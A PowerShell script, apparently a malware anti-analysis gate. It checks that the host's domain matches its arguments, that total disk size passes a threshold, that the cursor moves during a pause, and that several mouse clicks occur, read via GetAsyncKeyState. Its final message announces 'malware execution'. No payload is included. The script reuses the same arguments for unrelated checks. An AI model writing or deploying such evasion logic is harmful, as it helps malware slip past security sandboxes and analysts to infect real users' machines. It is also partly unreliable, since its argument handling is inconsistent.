if ((Get-WMIObject -Class Win32_ComputerSystem).Domain -eq ($($args) -join "")) {
    ############################################################################################################################ CHECK
    Write-Output "Proceed!"
    if ($Args.count -eq 0) {
         $minDiskSizeGB = 50
    } 
    else {
        $minDiskSizeGB = $($args[0])
    }

    $diskSizeGB = (GWMI -Class Win32_LogicalDisk | Measure-Object -Sum Size | Select-Object -Expand Sum) / 1073741824 

    if ($diskSizeGB -gt $minDiskSizeGB) {
    Write-Output "The disk size of this host is $diskSizeGB GB, which is greater than the minimum you set of $minDiskSizeGB GB. Proceed!"
    ############################################################################################################################ CHECK
    Add-Type -AssemblyName System.Windows.Forms

    $secs = 20
    if ($Args.count -eq 1) {
	    $secs = $($args[0])
    } 

    Add-Type -AssemblyName System.Windows.Forms

    $x1 = [System.Windows.Forms.Cursor]::Position.X
    $y1 = [System.Windows.Forms.Cursor]::Position.Y
    Write-Output "The coordinates of the cursor are currently x: $x1, y: $y1"

    Start-Sleep $secs

    $x2 = [System.Windows.Forms.Cursor]::Position.X
    $y2 = [System.Windows.Forms.Cursor]::Position.Y
    Write-Output "After sleeping $secs seconds, the coordinates of the cursor are now x: $x2, y: $y2"

    if ($x1 - $x2 -eq 0 -and $y1 - $y2 -eq 0) {
	    Write-Output "The cursor has not moved in the last $secs seconds. Do not proceed."
    } 
    else 
    {
	    Write-Output "The cursor is not in the same position as it was $secs seconds ago. Proceed!"
        ############################################################################################################################ CHECK
        $minClicks = 3
        $count = 0
        if ($Args.count -eq 1) {
            $minClicks = $($args[0])
        } 

        $getAsyncKeyProto = @'
        [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
        public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@

        $getAsyncKeyState = Add-Type -MemberDefinition $getAsyncKeyProto -Name "Win32GetState" -Namespace Win32Functions -PassThru

        while ($count -lt $minClicks) {
        Start-Sleep 1
        $leftClick = $getAsyncKeyState::GetAsyncKeyState(1)
        $rightClick = $getAsyncKeyState::GetAsyncKeyState(2)

        if ($leftClick) {
            $count += 1
        } 

        if ($rightClick) {
            $count += 1
        }
        }
        ############################################################################################################################ CHECK
        Write-Output "Now that the user has clicked $minClicks times, we may proceed with malware execution!"

    }


    } else {
    Write-Output "The disk size of this host is $diskSizeGB GB, which is less than the minimum you set of $minDiskSizeGB GB. Do not proceed."
    }
}
